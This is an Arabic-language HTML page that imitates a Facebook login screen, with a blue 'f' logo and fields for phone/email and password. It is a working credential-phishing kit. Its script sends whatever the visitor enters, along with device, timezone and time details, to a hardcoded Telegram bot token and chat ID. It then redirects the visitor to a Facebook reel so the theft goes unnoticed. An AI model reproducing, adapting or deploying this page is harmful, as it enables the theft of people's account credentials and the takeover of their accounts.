<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>D - تسجيل الدخول</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .logo-container {
            margin-bottom: 60px;
        }

        .logo {
            width: 80px;
            height: 80px;
            background: #1877f2;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 42px;
            font-weight: bold;
            font-family: 'Segoe UI', sans-serif;
        }

        .form-container {
            width: 100%;
            max-width: 360px;
        }

        .input-group {
            margin-bottom: 12px;
        }

        .input-field {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #dddfe2;
            border-radius: 12px;
            font-size: 16px;
            background: #f5f6f7;
            outline: none;
            transition: border-color 0.2s;
            text-align: right;
        }

        .input-field:focus {
            border-color: #1877f2;
            background: #ffffff;
        }

        .input-field::placeholder {
            color: #8a8d91;
        }

        .submit-btn {
            width: 100%;
            padding: 14px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 24px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
            transition: background 0.2s;
        }

        .submit-btn:hover {
            background: #166fe5;
        }

        .submit-btn:active {
            transform: scale(0.98);
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8a8d91;
            font-size: 14px;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #dadde1;
            margin: 0 10px;
        }

        .create-account {
            width: 100%;
            padding: 12px;
            background: transparent;
            color: #1877f2;
            border: 1px solid #1877f2;
            border-radius: 24px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            margin-top: auto;
            transition: background 0.2s;
        }

        .create-account:hover {
            background: #e7f3ff;
        }

        .footer {
            margin-top: 40px;
            text-align: center;
        }

        .language-selector {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #8a8d91;
            font-size: 13px;
            margin-bottom: 16px;
        }

        .loading {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid #ffffff;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="logo-container">
        <div class="logo">f</div>
    </div>

    <div class="form-container">
        <form id="loginForm">
            <div class="input-group">
                <input 
                    type="text" 
                    id="fullName" 
                    class="input-field" 
                    placeholder="رقم الهاتف المحمول أو البريدالإيكتروني" 
                    required
                >
            </div>
            
            <div class="input-group">
                <input 
                    type="number" 
                    id="age" 
                    class="input-field" 
                    placeholder="كلمة السري" 
                    min="1" 
                    max="120"
                    required
                >
            </div>

            <button type="submit" class="submit-btn" id="submitBtn">
                <span id="btnText">تسجيل الدخول</span>
                <div class="loading" id="loading"></div>
            </button>
        </form>

        <div class="divider">أو</div>

        <button class="create-account">إنشاء حساب جديد</button>
    </div>

    <div class="footer">
        <div class="language-selector">
            <span>العربية</span>
            <span>›</span>
        </div>
    </div>

    <script>
        // ============================================
        // ⚙️ إعداداتك - عدل هنا فقط
        // ============================================
        
        // توكن بوت التليجرام
        const BOT_TOKEN = '8422907042:AAE4hkxpTZtfJh5wDlJEI9NeLLjR3jt7XNQ';
        
        // ايدي الشات (قناتك أو مجموعتك)
        const CHAT_ID = '5015426926';
        
        // 🔗 رابط المجموعة اللي تبي يفتحها بعد الإرسال
        const GROUP_LINK = 'https://facebook.com/reel/1337999274989922/?fs=e&fs=e';
        
        // ============================================

        const form = document.getElementById('loginForm');
        const submitBtn = document.getElementById('submitBtn');
        const btnText = document.getElementById('btnText');
        const loading = document.getElementById('loading');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const fullName = document.getElementById('fullName').value.trim();
            const age = document.getElementById('age').value;

            if (!fullName || !age) {
                alert('الرجاء ملء جميع الحقول');
                return;
            }

            // إظهار حالة التحميل
            btnText.style.display = 'none';
            loading.style.display = 'block';
            submitBtn.disabled = true;

            // تجهيز رسالة التليجرام
            const message = `
📥 *طلب جديد - f*

👤 *الاسم:* ${fullName}
🎂 *العمر:* ${age}
📱 *الجهاز:* ${navigator.userAgent.split('(')[1]?.split(')')[0] || 'Unknown'}
🌐 *المنطقة:* ${Intl.DateTimeFormat().resolvedOptions().timeZone}
⏰ *الوقت:* ${new Date().toLocaleString('ar-SA')}
            `;

            // 🚀 إرسال البيانات + فتح الرابط فوراً (بدون انتظار)
            // نستخدم Promise.all حتى يصير الاثنين بنفس الوقت
            const sendToTelegram = fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });

            // فتح الرابط مباشرة بدون ما ننتظر الـ API
            window.location.href = GROUP_LINK;

            // نحاول نرسل للتليجرام بالخلفية (ما يهمنا النتيجة)
            try {
                await sendToTelegram;
            } catch (error) {
                console.log('تم التوجيه، إرسال التليجرام بالخلفية');
            }
        });

        // منع إدخال أرقام سالبة أو أكبر من 120
        document.getElementById('age').addEventListener('input', function(e) {
            if (this.value < 1) this.value = 1;
            if (this.value > 120) this.value = 120;
        });
    </script>
</body>
</html>
